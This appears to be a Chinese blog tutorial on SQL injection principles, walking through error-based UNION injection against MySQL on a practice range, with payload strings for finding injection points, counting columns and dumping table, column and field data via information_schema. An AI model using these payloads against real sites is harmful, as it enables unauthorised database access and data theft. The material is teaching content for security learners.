# 原创
：  SQL注入原理分析

# SQL注入原理分析

**目录**

[SQL注入的本质](#h2-1)

[显错注入-联合查询（Mysql数据库）的基本流程](#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B)

[显错注入靶场的做法](#h2-3)

---


> 
如果文章对你有帮助，欢迎**关注、点赞、收藏**一键三连支持以下哦！
想要一起交流学习的小伙伴可以加zkaq222（备注CSDN，不备注通不过哦）进入学习，共同学习进步


### SQL注入的本质

> 
注入攻击的**本质: 把用户输入的数据当做代码执行**。
两个关键条件：
第一个是用户能够控制输入
第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行


针对**SQL语句的注入**，也可以理解为用户输入的数据当做**SQL语句的代码执行**

### 显错注入-联合查询（Mysql数据库）的基本流程

 

> 
重要知识点: **通过系统自带库查询数据**
通过系统自带库查询数据 Mysql在5.0以上版本加入了**information_schema **这个系统自带库
其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等
**information_schema.tables**存放表名和库名的对应
**information_schema.columns**存放字段名和表名的对应
**注： 【information_schema.tables 实际上是选中information_schema库中的tables表】**


### 显错注入靶场的做法

**1.判断注入点**

最古老的方法：       and 1=1 页面正常       and 1=2  页面不正常

最简单的方法：       页面后面加',看是否报错

好用的方法：          如果是数字型传参，可以尝试-1

例如：    http://www.xxx.com/new.php?id=1   页面显示id=1的新闻

http://www.xxx.com/new.php?id=2-1  页面显示id=1的新闻

and 1=1 and 1=2 被拦截的可能性太高了

可以尝试 and -1=-1 and -1=-2 and 1&gt;0  or 1=1

或者直接 or sleep(5)

**2. 判断当前页面字段总数**

and 1=1 order by 1,2,3,4,5……

**3.判断显示位 **

and 1=2 union select 1,2,3,4,5,6,7……

**4.查当前数据库 **

and 1=2 union select 1,2,database()

**5.查表名 **

and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1

**6.查列名 **

and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 0,1

**7.查字段内容 **

and 1=2 union select 1,字段名,字段名 from 表名 limit 0,1

**注：**函数**GROUP_CONCAT**将多行数据进行整合在一行输出

 
